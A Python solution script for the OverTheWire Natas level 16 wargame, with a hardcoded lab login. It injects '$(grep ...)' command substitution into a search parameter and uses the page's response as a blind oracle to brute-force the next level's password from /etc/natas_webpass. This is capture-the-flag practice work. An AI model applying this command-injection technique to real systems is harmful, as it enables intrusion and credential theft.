from string import ascii_letters
import requests
from requests.auth import HTTPBasicAuth

def main():
    CHARS = ascii_letters + "0123456789"
    NATAS_AUTH = HTTPBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")

    # Get all characters from the natas17 password (unsorted)
    pwChars = []
    for c in CHARS:
        r = requests.post(url="http://natas16.natas.labs.overthewire.org/", auth=NATAS_AUTH,
        params={"needle": f"African$(grep {c} /etc/natas_webpass/natas17)", "submit": "Search"})
        
        if "African" not in str(r.content):
            pwChars.append(c)

    print(pwChars)

    # Bruteforce the password with the unsorted characters
    password = ""
    for i in range(32):
        for c in pwChars:
            r = requests.post(url="http://natas16.natas.labs.overthewire.org/", auth=NATAS_AUTH, 
            params={"needle": f"African$(grep ^{password + c} /etc/natas_webpass/natas17)", "submit": "Search"})
            print(f"African$(grep ^{password + c} /etc/natas_webpass/natas17)")

            if "African" not in str(r.content):
                password+=c
                break 
    

    print("-----------------------------------------")
    print(f"The password is: {password}")

if __name__ == "__main__":
    main()